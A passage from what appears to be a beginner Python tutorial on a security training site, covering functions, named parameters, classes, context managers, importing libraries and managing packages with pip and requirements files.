<p>Similarly, in Python, we can define and call functions to reuse code and work with our data more efficiently - as we do not need to reinvent the wheel all the time. We can define functions in Python in their simplest form very easily.</p>
<p>Here is an example of defining <code>f(x) = 2 * x + 5</code> as a function in Python:</p>
<p><strong>First Function</strong></p>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span><span class="hljs-params">(x)</span></span>:
    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * x + <span class="hljs-number">5</span>
</code></pre>
<p>Besides the (essential) syntax with indentation at the <code>inner scope</code> of the function - the code inside the function - what is important to note here are the <code>def</code> and <code>return</code> keywords. The <code>def</code> keyword is how we define functions in Python. Following <code>def</code> comes the function name (written in snake_case), input parameters inside the parentheses, and a colon. This first line of a function is called the <code>signature</code> of the function. After having written a couple of different functions, we can tell them apart by simply looking at their names and the arguments they accept. We can tell them apart by comparing their function signatures.</p>
<p>Let us create a function to calculate and return that one value to the power of another value:</p>
<p><strong>Power_Of Function</strong></p>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">power_of</span><span class="hljs-params">(x, exponent)</span></span>:
    <span class="hljs-keyword">return</span> x ** exponent
</code></pre>
<p>In Python, the <code>**</code> symbols mean &quot;power of&quot;. If we call <code>power_of(4, 2)</code>, we will get back four-to-the-power-of-two or simply four squared. Now, where does this result end up? It will end up in one of two places, depending on what we do: 1) the empty void of nothingness, 2) a variable. Consider this example:</p>
<p><strong>Function Call</strong></p>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">power_of</span><span class="hljs-params">(x, exponent)</span>:</span>
    <span class="hljs-keyword">return</span> x ** exponent

power_of(<span class="hljs-number">4</span>, <span class="hljs-number">2</span>)          <span class="hljs-comment"># The function was run, but nothing caught the return value.</span>
eight = power_of(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)  <span class="hljs-comment"># Variable "eight" is now equal to two-to-the-power-of-three.</span>
</code></pre>
<p>So is the first form pointless, then? No. As with the input/output of a terminal, we can &quot;pipe&quot; the function&#39;s output to the &quot;input&quot; of another. We can use the result of calling a function as the input for another one. For example:</p>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'My favourite number is:'</span>)</span></span>
<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(power_of(<span class="hljs-number">4</span>, <span class="hljs-number">2</span>)</span></span>)
</code></pre>
<p>Here we are calling the function <code>print</code> and giving it first a string as input, and next, we are giving it <code>the result</code> of another function call. At <code>runtime</code>, during the script&#39;s actual execution, Python will first execute the first line and then go to the 2nd line and execute the commands from inside out. It will, in other words, start by calculating <code>power_of(4, 2)</code> and then use this result as input to the <code>print</code> function.</p>
<p>Imagine if we were to call a function with ten parameters. Having to remember each parameter is challenging once the amount of parameters increases above two, so in addition to these <code>positional</code> parameters, Python supports what is called <code>named parameters</code>. While positional parameters require us to always insert the parameters in the correct order, named parameters let us use whichever order we prefer. However, they require us to specify which value goes to which parameter explicitly. Using named parameters might seem silly, but after a week or a month of looking at other things, it can be a blessing to have expressly specified, by parameter names, which is which. Let us look at an example. Consider the below function, which is a template invitation to a school event.</p>
<p><strong>Invitation.py</strong></p>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_sample_invitation</span><span class="hljs-params">(mother, father, child, teacher, event)</span>:</span>

    <span class="hljs-comment"># Notice here the use of a multi-line format-string: f''' text here '''</span>
    sample_text = f<span class="hljs-string">'''
Dear {mother} and {father}.
{teacher} and I would love to see you both as well as {child} at our {event} tomorrow evening. 

Best regards,
Principal G. Sturgis.
'''</span>
    print(sample_text)

print_sample_invitation()
</code></pre>
<p>If we were just to fill out the blanks, chances are we would forget who is who within minutes, rather than weeks. Note: the above code will error because we do not provide any arguments for the <code>print_sample_invitation</code> function.</p>
<p>What we can do instead is to specify exactly who is who, like so:</p>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-title">print_sample_invitation</span><span class="hljs-params">(mother=<span class="hljs-string">'Karen'</span>, father=<span class="hljs-string">'John'</span>, child=<span class="hljs-string">'Noah'</span>, teacher=<span class="hljs-string">'Tina'</span>, event=<span class="hljs-string">'Pizza Party'</span>)</span></span>
</code></pre>
<p>Specifying the names within the function will change our script to this:</p>
<p><strong>Invitation.py - Modified</strong></p>
<pre><code class="lang-python"><span class="hljs-comment"># Defining the function</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_sample_invitation</span><span class="hljs-params">(mother, father, child, teacher, event)</span>:</span>

    <span class="hljs-comment"># Notice here the use of a multi-line format-string: f''' text here '''</span>
    sample_text = f<span class="hljs-string">'''
Dear {mother} and {father}.
{teacher} and I would love to see you both as well as {child} at our {event} tomorrow evening. 

Best regards,
Principal G. Sturgis.
'''</span>
    <span class="hljs-comment"># Print output</span>
    print(sample_text)

<span class="hljs-comment"># Call function</span>
print_sample_invitation(mother=<span class="hljs-string">'Karen'</span>, father=<span class="hljs-string">'John'</span>, child=<span class="hljs-string">'Noah'</span>, teacher=<span class="hljs-string">'Tina'</span>, event=<span class="hljs-string">'Pizza Party'</span>)
</code></pre>
<p>This will produce the following output:</p>
<p><strong>Invitation.py - Execution</strong></p>
<p>&#x20; Defining Functions</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">python3</span> invitation.<span class="hljs-keyword">py</span>

Dear Karen <span class="hljs-built_in">and</span> John.
Tina <span class="hljs-built_in">and</span> I would love <span class="hljs-keyword">to</span> see you both <span class="hljs-keyword">as</span> well <span class="hljs-keyword">as</span> Noah at our Pizza Party tomorrow evening.

Best regards,
Principal G. Sturgis.
</code></pre>
<p>Once again, Python scripts are executed from top to bottom, so always keep in mind that Python needs to know about the functions and variables before they are being referenced. Also, keep in mind the scopes of the code. Scopes let us reference variables and functions <code>outside</code> of our current scope (e.g., code in functions can use variables and the global scope), but not <code>inside</code> of it. In other words, we cannot reuse a variable we defined inside a function, outside of it. Besides that, Python comes with many different <a href="https://docs.python.org/3/library/functions.html">Built-in Functions</a>.</p>
<p>Now that we know the basics of defining and working with functions, let us add some more building blocks to our arsenal of coding tools: <code>Classes</code>&#x20;</p>
<hr>
<h2 id="making-code-classy">Making Code Classy</h2>
<hr>
<p>In this section, we will talk about classes. And cake. Let us start with the cake. When we have a piece of brownie in front of us, let us, for the sake of argument, say this piece of brownie is an <code>object</code> of the food type <code>Cake</code>. Our piece of cake has some properties that other pieces of cake might not have. One such property could be the topping which in our case could be chocolate frosting and a cherry. We need to ask ourselves how this piece of cake was produced and what it consists of.</p>
<p>Cooking recipes and classes are much alike because they define how a dish - or some object - is produced. A cake might have a fixed amount of flour and water, but leave it up to the chef to add a chocolate or strawberry frosting. A <code>class</code> is a spec of how an object of some type is produced. The result of <code>instantiating</code> such a <code>class</code> is an object of the class. Let us look at an example:</p>
<p><strong>The DreamCake Class</strong></p>
<pre><code class="lang-python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DreamCake</span>:</span>
    <span class="hljs-comment"># Measurements are defined in grams or units</span>
    eggs = <span class="hljs-number">4</span>
    sugar = <span class="hljs-number">300</span> 
    milk = <span class="hljs-number">200</span>
    butter = <span class="hljs-number">50</span>
    flour = <span class="hljs-number">250</span>
    baking_soda = <span class="hljs-number">20</span>
    vanilla = <span class="hljs-number">10</span>

    topping = None
    garnish = None

    is_baked = False

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, topping=<span class="hljs-string">'No topping'</span>, garnish=<span class="hljs-string">'No garnish'</span>)</span></span>:
        <span class="hljs-keyword">self</span>.topping = topping
        <span class="hljs-keyword">self</span>.garnish = garnish

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bake</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span>:
        <span class="hljs-keyword">self</span>.is_baked = True

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_cake_ready</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span>:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">self</span>.is_baked
</code></pre>
<p>Similar to how functions were defined using the <code>def</code> keyword, classes are defined using the <code>class</code> keyword, followed by the name of the class, in the CapWords naming convention. CapWords means all words used in the name are capitalized and squeezed together, like <code>CapWordsArePrettyCool</code>.</p>
<p>Next up come the ingredients that produce a basic (and tasty, by the way) cake, which will never change in this example. The <code>topping</code> and <code>garnish</code> variables are set to <code>None</code> right after space. This suggests that these variables will have concrete values assigned at a later point - in this case, inside the <code>__init__</code> function of the class. This function automatically gets called by Python once a new instance of a class is requested. The <code>__init__</code> function is a so-called &quot;Magic Method&quot;. We will not cover Magic Methods in detail, but a note about them has been included in the optional, advanced part at the bottom.</p>
<p>Getting back to the class, please notice about the <code>__init__</code> function, the <code>self</code> parameter. This parameter is a <code>mandatory, first</code> parameter of <code>all</code> class functions. Long story short, classes need a way to refer to their own variables and functions. Python is designed to require a &quot;<code>self</code>&quot; parameter in the first position of the function signature. We can then refer to other functions within class functions by calling <code>self.other_func()</code> or <code>self.topping</code>. Note that we do not need to provide a value for it when calling functions on class objects despite this first&#39; self&#39; parameter. We will see this later.</p>
<p>Another little trick to notice is the default values for function parameters. These allow us to completely commit specifying a value for one or more of the parameters. The parameters will - in that case - then be set to their default values as specified, and <code>topping</code> is set to <code>&#39;No topping&#39;</code> unless overridden when we create an object.</p>
<p>Lastly, in this example, we have defined a function <code>inside of the class scope</code> as dictated by the indentation level. This means that the function <code>bake</code> is <code>only</code> accessible to code from within the class itself (e.g., code inside one function calling another function) and objects instantiated from the class. Let us create some example objects to illustrate this behavior better.</p>
<p><strong>A Plain Cake</strong></p>
<p>The topping and garnish default to &quot;No topping&quot; and &quot;No garnish&quot; for a plain cake, respectively.</p>
<pre><code class="lang-python"><span class="hljs-attr">plain_cake</span> = DreamCake()
</code></pre>
<p><strong>A Chocolate Cake</strong></p>
<p>We need to add chocolate frosting on top for a chocolate cake, but no garnish (defaults to <code>&quot;No garnish&quot;</code>).</p>
<pre><code class="lang-python"><span class="hljs-attr">chocolate_cake</span> = DreamCake(topping=<span class="hljs-string">'Chocolate frosting'</span>)
</code></pre>
<p><strong>A Luxury Cake</strong></p>
<p>Our luxury cakes have the topping and garnish explicitly set.</p>
<pre><code class="lang-python"><span class="hljs-attr">luxury_strawberry_cake</span> = DreamCake(topping=<span class="hljs-string">'Strawberry frosting'</span>, garnish=<span class="hljs-string">'Chocolate bits'</span>)
</code></pre>
<p>This can, of course, also be specified <code>without</code> using named parameters for brevity:</p>
<pre><code class="lang-python"><span class="hljs-attr">luxury_strawberry_cake</span> = DreamCake(<span class="hljs-string">'Strawberry frosting'</span>, <span class="hljs-string">'Chocolate bits'</span>)
</code></pre>
<p>As shown above, classes are instantiated into objects similar to how we call functions: type the name followed by parentheses with possible parameters specified. Now that we have objects of the class <code>DreamCake</code> stored in variables, we can call the functions of the class <code>on</code> the object variables by appending a <code>.</code> and the function.</p>
<p><strong>Baking the Cake</strong></p>
<pre><code class="lang-python">chocolate_cake = DreamCake(topping=<span class="hljs-symbol">'Chocolate</span> frosting')

chocolate_cake.bake()  # Call the <span class="hljs-keyword">function</span> <span class="hljs-title">"bake"</span> on the object.
<span class="hljs-keyword">is</span>_cake_done = chocolate_cake.is_cake_ready()

print(is_cake_done)  # Prints <span class="hljs-string">"True"</span> because we called <span class="hljs-string">"bake"</span> earlier
</code></pre>
<p>See the <code>bake()</code> function call on the <code>chocolate_cake</code>? Even though the <code>bake</code> function within the class has a <code>self</code> parameter, we do not need to specify its value. We will not dive into the decisions as to why this is, and it is just something to remember. In closing, it is worth mentioning that this code style is a small part of <a href="https://en.wikipedia.org/wiki/Object-oriented_programming">Object-Oriented Programming (OOP)</a>. There is much more to OOP than simply using classes - enough for an entirely separate module - but in its simplest forms, we define classes, create objects (or &quot;instances&quot;) of these classes and use them to hold data or call functions.</p>
<hr>
<h3 id="advanced-notes-on-classes">Advanced Notes on Classes</h3>
<p>If you are new to programming, do not be disheartened if this sounds a little too complicated. It is. The following are very brief notes on some more advanced usages of classes, which we mostly do not need to worry about at all in our day-to-day programming, but which are pretty cool to know about regardless.</p>
<p>One thing I promised to explain briefly is Magic Methods. Magic Methods are functions - or methods as they are also called in many programming languages - which exist by default and have a default implementation in all classes. This is because of the <code>class hierarchy</code> in Python, where all classes inherit from a base class <code>object</code> (&quot;object&quot; is the name of the base class - slightly confusing perhaps).</p>
<p>This statement opens a large box of OOP that we will not go through, but feel free to research &quot;Python class inheritance&quot; and similar phrases on your own. In short, &quot;class inheritance&quot; means that one class can inherit the type and its functions and internal variables. This base class gives objects some basic functionality, for example, the ability to compare against one another (is one cake the same as another?) or get a <code>string representation</code> of the object.</p>
<p>Say we have a class <code>Circle</code>, the object itself is raw data stored in memory that only Python knows how to read, but the <code>string representation</code> of a <code>Circle</code> object could be <code>&quot;Circle(r=5)&quot;</code> for example describing a circle with a radius of 5. The Magic Method responsible for returning a string representation of an object is <code>__str__</code>. Calling this function on an object is similar to calling <code>str(...)</code> with the object as a parameter. For example, consider the following snippet from my Python IDLE:</p>
<p><strong>Overriding Magic Methods (IDLE)</strong></p>
<pre><code class="lang-python"><span class="hljs-meta">&gt;&gt;</span>&gt; <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Circle</span>:</span>
...     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, radius)</span></span>:
...         <span class="hljs-keyword">self</span>.radius = radius
...
...     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span>:
...         <span class="hljs-keyword">return</span> f<span class="hljs-string">'Circle(r={self.radius})'</span>
...
<span class="hljs-meta">&gt;&gt;</span>&gt; my_circle = Circle(<span class="hljs-number">5</span>)
<span class="hljs-meta">&gt;&gt;</span>&gt; str(my_circle)
<span class="hljs-string">'Circle(r=5)'</span>
</code></pre>
<p>If we did not override the <code>__str__</code> function, the code would still work, but the output would be less meaningful:</p>
<pre><code class="lang-python"><span class="hljs-comment">'<span class="hljs-doctag">&lt;__main__.Circle object at 0x022FFB98&gt;</span>'</span>
</code></pre>
<p>This string represents a <code>Circle</code> object inside <code>__main__</code> (here, the IDLE), located at memory address <code>0x022FFB98</code>.</p>
<p>Another two Magic Methods worth mentioning are the <code>__enter__</code> and <code>__exit__</code> functions, allowing us to create classes that support using the <code>with</code> keyword. The <code>with</code> keyword will enable us to specify the default functionality of a class for build-up and teardown procedures. For example, the class <code>C2TcpConnection</code> which represents a TCP connection to a C2 server. The build-up step could include initiating a socket and attempting to authenticate given input from external sources. The teardown step could include proper error handling and a guarantee of properly closing the socket after use. This is advanced but fun and &quot;Pythonic&quot; coding which I recommend you to research.</p>
<p>Let us briefly consider an example before moving on to the next section of the module.</p>
<p><strong>Class Supporting WITH Context Manager</strong></p>
<pre><code class="lang-python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Foo</span><span class="hljs-params">()</span>:</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__enter__</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">"Enter..."</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__exit__</span><span class="hljs-params">(self, type, value, traceback)</span>:</span>
        print(<span class="hljs-string">"...and exit."</span>)
</code></pre>
<p>Here a class <code>Foo</code> is defined with a simple <code>__enter__</code> and <code>__exit__</code> function, which does nothing but print a message. This allows us to use the <code>with</code> clause to &quot;wrap&quot; this supposed reused boilerplate code around concrete code, for example:</p>
<pre><code class="lang-python"><span class="hljs-keyword">with</span> Foo():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"Hello world!"</span>)
</code></pre>
<p>This prints the following to the console:</p>
<p>&#x20; Making Code Classy</p>
<pre><code class="lang-shell-session">Enter...
Hello world!
...and <span class="hljs-keyword">exit</span>.
</code></pre>
<p>Furthermore, we can change the with-clause to something like <code>with Foo() as foo</code>, which allows us to reference the instantiated object of <code>Foo</code> used to wrap around our code. Doing so is useful if, for example, the <code>Foo</code> class has functions we want to call from within the with-clause such as <code>get_connection_status</code> in the example of creating a <code>C2TcpConnection</code> class. More frequent use of the with clause is <code>with open(&#39;/path/to/file.txt&#39;, &#39;w&#39;) as wr</code>, which opens a file for writing. We can then use <code>wr.write(&#39;something&#39;)</code> to write &quot;something&quot; to the file. At the end of the with-clause, we do not need to close the output streams to the file - the teardown functionality in the <code>open</code> class takes care of that.</p>
<hr>
<h2 id="introduction-to-libraries">Introduction to Libraries</h2>
<hr>
<p>We have discussed how to create classes and functions, functions within classes, and other simple concepts. All of this has been inside one Python file, also known as <code>a module</code>, but it would be great if we could share the code inside this module with other people or reuse it in other projects. It would also be great to reuse code that other people have made for us, for example, code that lets us communicate with web servers or even something as simple as getting the current date. Enter libraries.</p>
<p>A <code>library</code> in programming is in many ways similar to a library in real life. It is a collection of knowledge that we can borrow in our projects without reinventing the wheel. Once we <code>import</code> a library, we can use everything inside it, including functions and classes. Some libraries ship along with Python, for example, <code>datetime</code>, which lets us get an object representing the current, local date, and time.</p>
<p>Let us see what classes and functions the library <code>datetime</code> contains. For that, we will use the built-in function called <a href="https://docs.python.org/3/library/functions.html#dir">dir()</a>.</p>
<p><strong>Dir(datetime)</strong></p>
<pre><code class="lang-python"><span class="hljs-meta">&gt;&gt;</span>&gt; import datetime
<span class="hljs-meta">&gt;&gt;</span>&gt; dir(datetime)
[<span class="hljs-string">'MAXYEAR'</span>, <span class="hljs-string">'MINYEAR'</span>, <span class="hljs-string">'__builtins__'</span>, <span class="hljs-string">'__cached__'</span>, <span class="hljs-string">'__doc__'</span>, <span class="hljs-string">'__file__'</span>, <span class="hljs-string">'__loader__'</span>, <span class="hljs-string">'__name__'</span>, <span class="hljs-string">'__package__'</span>, <span class="hljs-string">'__spec__'</span>, <span class="hljs-string">'date'</span>, <span class="hljs-string">'datetime'</span>, <span class="hljs-string">'datetime_CAPI'</span>, <span class="hljs-string">'sys'</span>, <span class="hljs-string">'time'</span>, <span class="hljs-string">'timedelta'</span>, <span class="hljs-string">'timezone'</span>, <span class="hljs-string">'tzinfo'</span>]
</code></pre>
<p><strong>The datetime Library</strong></p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> datetime

now = datetime.datetime.now()
<span class="hljs-keyword">print</span>(now)  <span class="hljs-comment"># Prints: 2021-03-11 17:03:48.937590</span>
</code></pre>
<p>As we see, we have to call <code>datetime.datetime.now()</code> to get the current timestamp. We import the library, or <code>module</code>, <code>datetime</code>, which then becomes available to reference by name. This module is also called <code>datetime</code>, which contains a <code>now()</code> function. So to get to the <code>now()</code> function, we first have to reference the module, then the class, and finally the function, all &quot;chained together&quot; to speak with dots.</p>
<p>This may become cumbersome and clutter the code, so let us look at alternative ways of importing:</p>
<p><strong>Importing a Class From a Library</strong></p>
<pre><code class="lang-python"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime

<span class="hljs-keyword">print</span>(datetime.now())
</code></pre>
<p><strong>Giving It a New Name</strong></p>
<pre><code class="lang-python">from datetime import datetime as <span class="hljs-selector-tag">dt</span>

<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(dt.now()</span></span>)
</code></pre>
<p>The above example contains two newlines between the import statement and the code. This is because the PEP-8 style guide, Python&#39;s guidelines for &quot;correct&quot; Python, urges developers to add two new lines between import statements and the actual code. It also suggests using the CapWords convention for class names but notes a separate style guide for built-in names. See <a href="https://www.python.org/dev/peps/pep-0008/#class-names">https://www.python.org/dev/peps/pep-0008/#class-names</a> for more information. This is why classes such as <code>datetime</code> are in lowercase.</p>
<p>Next up, we will dive deeper into how to install and manage external libraries in Python.</p>
<hr>
<h2 id="managing-libraries-in-python">Managing Libraries in Python</h2>
<hr>
<p>The most popular way of installing external packages in Python is by using <a href="https://pip.pypa.io/en/stable/">pip</a>. According to the author, <code>pip</code> is short for <a href="https://ianbicking.org/blog/2008/10/pyinstall-is-dead-long-live-pip.html">&quot;pip installs packages&quot;</a>, a recursive abbreviation (meaning the definition refers to the abbreviation, and thus circles itself). Very funny indeed. Regardless, <code>pip</code> is the name of the Python module that manages external Python packages. With <code>pip</code>, we can install, uninstall and upgrade Python packages. Unlike downloading and installing plugins for a browser or text editor, it is not common to &quot;go shopping&quot; for Python packages.</p>
<p>Programming is all about using the right tool for the job, so do not worry about finding packages to install. The right approach, and probably also the one most common, is finding out <code>how to do something</code> and getting package recommendations along the way. The documentation of these packages - their websites most of the time - will typically show examples of installing the package for first-time users. Let us look at how to manage packages as well.</p>
<p>Some valuable arguments for <code>pip</code> that we will look at are <code>install</code> and<code>--upgrade</code> flag, <code>uninstall</code> and <code>freeze</code>. The <code>install</code> argument lets users install new packages or upgrade existing packages to the latest version (if the <code>--upgrade</code> parameter is provided). The <code>uninstall</code> argument will, as its name suggests, remove the package from the system. Surprisingly the <code>freeze</code> command has nothing to do with halting anything or cheesy police movies. This prints a list of all the installed (via pip) packages and their dependencies. We can call the commands either using <code>pip</code> directly or as a Python module. Below are some examples of how this might look.</p>
<p><strong>Installing &quot;flask&quot; with Pip</strong></p>
<p>&#x20; Managing Libraries in Python</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ # Syntax: python3 -m pip install [package]
root@htb[/htb]$ python3 -m pip install flask

Collecting flask
  Using cached Flask-<span class="hljs-number">1.1</span><span class="hljs-meta">.2</span>-py2.py3-none-any.whl (<span class="hljs-number">94</span> kB)
Collecting Werkzeug&gt;=<span class="hljs-number">0.15</span>
  Using cached Werkzeug-<span class="hljs-number">1.0</span><span class="hljs-meta">.1</span>-py2.py3-none-any.whl (<span class="hljs-number">298</span> kB)
Collecting itsdangerous&gt;=<span class="hljs-number">0.24</span>
  Using cached itsdangerous-<span class="hljs-number">1.1</span><span class="hljs-meta">.0</span>-py2.py3-none-any.whl (<span class="hljs-number">16</span> kB)
Collecting click&gt;=<span class="hljs-number">5.1</span>
  Using cached click-<span class="hljs-number">7.1</span><span class="hljs-meta">.2</span>-py2.py3-none-any.whl (<span class="hljs-number">82</span> kB)
Collecting Jinja2&gt;=<span class="hljs-number">2.10</span><span class="hljs-meta">.1</span>
  Downloading Jinja2-<span class="hljs-number">2.11</span><span class="hljs-meta">.3</span>-py2.py3-none-any.whl (<span class="hljs-number">125</span> kB)
     || <span class="hljs-number">125</span> kB <span class="hljs-number">7.0</span> MB/s 
Collecting MarkupSafe&gt;=<span class="hljs-number">0.23</span>
  Downloading MarkupSafe-<span class="hljs-number">1.1</span><span class="hljs-meta">.1</span>-cp39-cp39-macosx_10_9_x86_64.whl (<span class="hljs-number">16</span> kB)
Installing collected packages: Werkzeug, itsdangerous, click, MarkupSafe, Jinja2, flask
Successfully installed Jinja2-<span class="hljs-number">2.11</span><span class="hljs-meta">.3</span> MarkupSafe-<span class="hljs-number">1.1</span><span class="hljs-meta">.1</span> Werkzeug-<span class="hljs-number">1.0</span><span class="hljs-meta">.1</span> click-<span class="hljs-number">7.1</span><span class="hljs-meta">.2</span> flask-<span class="hljs-number">1.1</span><span class="hljs-meta">.2</span> itsdangerous-<span class="hljs-number">1.1</span><span class="hljs-meta">.0</span>
</code></pre>
<p>As can be seen, even though we only asked to install <code>flask</code>, a brilliant package for running Python-based web servers (as is <code>bottle</code> - same-same, but different), we get a multitude of other packages as well, which are all requirements of <code>flask</code>. We could try to upgrade it, but we are already told that we are already running the latest version.</p>
<p><strong>Upgrading Packages</strong></p>
<p>&#x20; Managing Libraries in Python</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ python3 -m pip install --upgrade flask

Requirement already up-to-date: flask in /usr</span><span class="hljs-regexp">/local/lib</span><span class="hljs-regexp">/python3.9/site</span>-packages (<span class="hljs-number">1.1</span>.<span class="hljs-number">2</span>)
Requirement already satisfied, skipping <span class="hljs-symbol">upgrade:</span> itsdangerous&gt;=<span class="hljs-number">0.24</span> in /usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">python3</span>.9/<span class="hljs-title">site</span>-<span class="hljs-title">packages</span> (<span class="hljs-title">from</span> <span class="hljs-title">flask</span>) (1.1.0)</span>
Requirement already satisfied, skipping upg...
&lt;SNIP&gt;
</code></pre>
<p>If we wanted to uninstall a particular package, we could do so by calling:</p>
<p><strong>Uninstalling Packages</strong></p>
<p>&#x20; Managing Libraries in Python</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ pip uninstall <span class="hljs-string">[package]</span>
</code></pre>
<p>Let us see what is currently installed by running <code>pip</code> with the <code>freeze</code> argument. As some of them are dependencies of <code>flask</code>, we will leave the uninstallation itself as &quot;extras.&quot; Please note that if we choose to uninstall a dependency package, the primary package likely will not work. Also, note that <code>freeze</code> may produce different outputs from machine to machine and Python version to Python version.</p>
<p><strong>Listing the Installed Packages</strong></p>
<p>&#x20; Managing Libraries in Python</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-comment"># Syntax: python3 -m pip freeze [package]</span>
root@htb[/htb]$ python3 -m pip freeze

<span class="hljs-attr">click==7.1.2</span>
<span class="hljs-attr">Flask==1.1.2</span>
<span class="hljs-attr">itsdangerous==1.1.0</span>
<span class="hljs-attr">Jinja2==2.11.3</span>
<span class="hljs-attr">MarkupSafe==1.1.1</span>
<span class="hljs-attr">protobuf==3.13.0</span>
<span class="hljs-attr">pynput==1.7.3</span>
<span class="hljs-attr">pyobjc-core==7.1</span>
<span class="hljs-attr">pyobjc-framework-Cocoa==7.1</span>
<span class="hljs-attr">pyobjc-framework-Quartz==7.1</span>
<span class="hljs-attr">six==1.15.0</span>
<span class="hljs-attr">Werkzeug==1.0.1</span>
</code></pre>
<p>This list of installed packages would be nice to be given to another person to either use our scripts or help with development. This way, they will know which packages need to be installed (and which versions even).</p>
<p>It just so happens to be the case that <code>pip</code> supports maintaining packages from a requirements file. This file, often called literally <code>requirements.txt</code>, contains a list of all the required packages needed to run the script successfully. The format is quite simple. We would copy the above <code>freeze</code> output and save it as a requirements file. However, it is a little bloated, and we do not need to know or even list the dependencies of the packages we need.</p>
<p>For the sake of an example, let us suppose that we would like to use <code>flask</code> and <code>click</code> (we will return to <code>click</code> later). If we do not know the version requirements or do not mind, either way, we could list the packages one after the other and save them, like so:</p>
<p><strong>Example requirements.txt</strong></p>
<p>&#x20; Managing Libraries in Python</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ cat requirements.txt

flask
click
</code></pre>
<p>Then, to install all the packages in the requirements file, we would type:</p>
<p><strong>Install from requirements.txt</strong></p>
<p>&#x20; Managing Libraries in Python</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ python3 -m pip install -r requirements.txt
</code></pre>
<p>This will then go through each of the requirements and install them by selecting the latest available and permitted version. Say we explicitly wanted <code>flask</code> version 1.1.2. All we had to do was replace <code>flask</code> with <code>flask==1.1.2</code> in the requirements file, just like the <code>pip freeze</code> command output. Below is a list of common version comparison operators that we are highly likely to come across in larger Python projects (read more at <a href="https://www.python.org/dev/peps/pep-0440/#version-specifiers">PEP 440</a>).</p>
<table>
<thead>
<tr>
<th><strong>Comparison Operator</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>==</code></td>
<td>Version matching clause</td>
</tr>
<tr>
<td><code>&lt;=</code> / <code>&gt;=</code></td>
<td>Inclusive ordered comparison clause</td>
</tr>
<tr>
<td><code>&lt;</code> / <code>&gt;</code></td>
<td>Exclusive ordered comparison clause</td>
</tr>
</tbody>
</table>
<p>They let us specify, in the requirements file, our exact requirements to versions. For example, if we know that some package <code>xyz</code> is vulnerable to exploitation at versions 1.0.4 and lower, we can specify in our requirements file that we need <code>xyz&gt;=1.0.5</code>. It is also pretty common for new updates of a package to break the current code (e.g., packages that rely on other third-party systems like the Discord bot API for Python). In these cases, we can force an older version of a package. At the same time, the needed changes were being worked on with the <code>&lt;</code> or <code>&lt;=</code> operator.</p>
<p>To not dig too deep into it right from the start, we will return to this topic later in the module. For now, let us move on with some pre-requisites for our first project.</p>
<hr>
<h2 id="the-importance-of-libraries">The Importance of Libraries</h2>
<hr>
<p>Now that we know how important libraries can be for our development and how to manage them let us discuss two of the more popular ones that we will use in our project, starting with the <code>requests</code> library.</p>
<hr>
<h3 id="the-requests-package">The Requests Package</h3>
<p>The <a href="https://requests.readthedocs.io/en/master/">requests</a> library is an elegant and simple HTTP library for Python. From the documenation:</p>
<p>Requests allows you to send HTTP/1.1 requests extremely easily. Theres no need to manually add query strings to your URLs, or to form-encode your POST data. Keep-alive and HTTP connection pooling are 100% automatic, thanks to urllib3.</p>
<p>Let us install requests just like we have learned.</p>
<p><strong>Installing requests</strong></p>
<p>&#x20; The Importance of Libraries</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python3 -m pip install requests

Collecting requests
  Downloading requests<span class="hljs-number">-2.25</span><span class="hljs-number">.1</span>-py2.py3-none-any.whl (<span class="hljs-number">61</span> kB)
     || <span class="hljs-number">61</span> kB <span class="hljs-number">3.8</span> MB/s
Collecting chardet&lt;<span class="hljs-number">5</span>,&gt;=<span class="hljs-number">3.0</span><span class="hljs-number">.2</span>
